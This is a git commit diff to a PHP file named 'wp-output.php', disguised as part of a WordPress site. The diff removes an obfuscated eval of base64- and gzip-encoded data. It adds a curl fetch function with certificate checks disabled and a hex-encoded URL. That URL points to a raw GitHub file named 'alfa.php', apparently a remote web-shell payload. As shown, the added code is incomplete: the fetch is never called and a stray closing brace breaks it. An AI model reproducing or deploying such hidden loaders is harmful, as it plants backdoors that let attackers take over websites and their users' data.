6949ec31800af9c51d1785ad241e83c76fe71cfa
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-01-30 18:25:28 +0700

    Update wp-output.php

--- wp-output.php
+++ wp-output.php
@@ -1,5 +1,19 @@
 <?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "sLr\x41uj4qsPznj2K6\x430J4M8tOqzm68\x43Pr1jwgmyMGm\x63JsM33w3n0k3Y\x2bLMvZL\x62Of9RSppWmQqnQ\x63t\x63IlMw6ej\x62\x41gyIDjnKeEhMYFUgG8DL6V\x61UtH5uETj\x63Ovm8TuuVg9IQfppP3hdyoERSoKk5YEthjiSxMor7KGL\x62q9Ql68v1\x43N7kT\x42X\x42g0vDiSZ78Tz\x61\x41qDW8jskP\x61vz\x2bn\x62II980dtw1R8Llsh\x62fNDereuj1S34p\x63l\x42\x61IloeQj0v4z2\x2bRzpy6OX9\x61YvOS9QtkpVu0zxiFVDlH450\x41uMtz6H7L8D00E\x421SQ0q6Ze3uww0vNMQZPyLv\x434ZZM\x614IzEQHlLfSWH0pfIwIKeXg36grigTxVUFky1z9KLD/tLu/Tf\x42vMzehd3tlWf/HLxNUr4I7EJSLJV4vhKpzQHUxJV\x63zgvZQqFQTKy/R/L\x2b\x42\x42M\x43v23R1o/GHQO\x42wJe\x2bv\x62\x41EFg/2GQS\x42wJe\x2bv\x61\x41UFg/mGQW\x42wJe\x2bvZ\x41kFg/WGQ\x61\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+function getURL($url) {
+    if (function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
+
+$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6561676c65733232372f636c61756469612f6d61696e2f616c66612e706870';
+
+}
 ?>
